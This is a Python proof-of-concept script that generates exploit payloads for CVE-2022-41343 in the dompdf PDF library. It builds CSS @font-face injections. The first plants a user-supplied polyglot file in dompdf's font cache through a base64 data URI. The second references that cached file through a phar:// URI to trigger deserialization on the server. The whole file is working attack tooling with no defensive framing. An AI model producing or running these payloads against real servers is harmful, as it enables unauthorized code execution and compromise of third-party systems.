#!/usr/bin/env python3
import argparse
import hashlib
import base64
import urllib.parse
import os

PAYLOAD_TEMPLATE_URL_ENCODED = """
<style>@font-face+{+font-family:'exploit';+src:url('%s');+font-weight:'normal';+font-style:'normal';}</style>
"""
PAYLOAD_TEMPLATE = """
<style>
    @font-face {
        font-family:'exploit';
        src:url('%s');
        font-weight:'normal';
        font-style:'normal';
    }
</style>
"""


def get_args():
    parser = argparse.ArgumentParser(
        prog="generate_payload.py",
        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=50),
        epilog="""
                       This script will generate payloads for CVE-2022-41343
                      """,
    )
    parser.add_argument("file", help="Polyglot File")
    parser.add_argument(
        "-p",
        "--path",
        default="/var/www/",
        help="Base path to vendor directory (Default = /var/www/)",
    )
    args = parser.parse_args()
    return args


def main():
    args = get_args()
    file = args.file.strip()
    path = args.path.strip()
    if os.path.exists(file):
        generate_payloads(file, path)
    else:
        print("ERROR: File doesn't exist.")


def generate_payloads(file, path):
    with open(file, "rb") as f:
        fc = f.read()
    b64 = base64.b64encode(fc)
    data_uri_encoded = "data:text/plain;base64,%s" % urllib.parse.quote_plus(
        b64.decode()
    )
    md5 = hashlib.md5(data_uri_encoded.encode()).hexdigest()
    data_uri_double_encoded = urllib.parse.quote_plus(data_uri_encoded)
    phar_uri = "phar://%s/vendor/dompdf/dompdf/lib/fonts/exploit_normal_%s.ttf##" % (
        path,
        md5,
    )
    req1_enc = PAYLOAD_TEMPLATE_URL_ENCODED % data_uri_double_encoded
    req2_enc = PAYLOAD_TEMPLATE_URL_ENCODED % urllib.parse.quote_plus(phar_uri)
    req1_pure = PAYLOAD_TEMPLATE % data_uri_double_encoded
    req2_pure = PAYLOAD_TEMPLATE % phar_uri
    print("====== REQUEST 1 ENCODED =======")
    print(req1_enc)
    print("====== REQUEST 2 ENCODED =======")
    print(req2_enc)
    print("====== REQUEST 1 NOT ENCODED =======")
    print(req1_pure)
    print("====== REQUEST 2 NOT ENCODED =======")
    print(req2_pure)


if __name__ == "__main__":
    main()
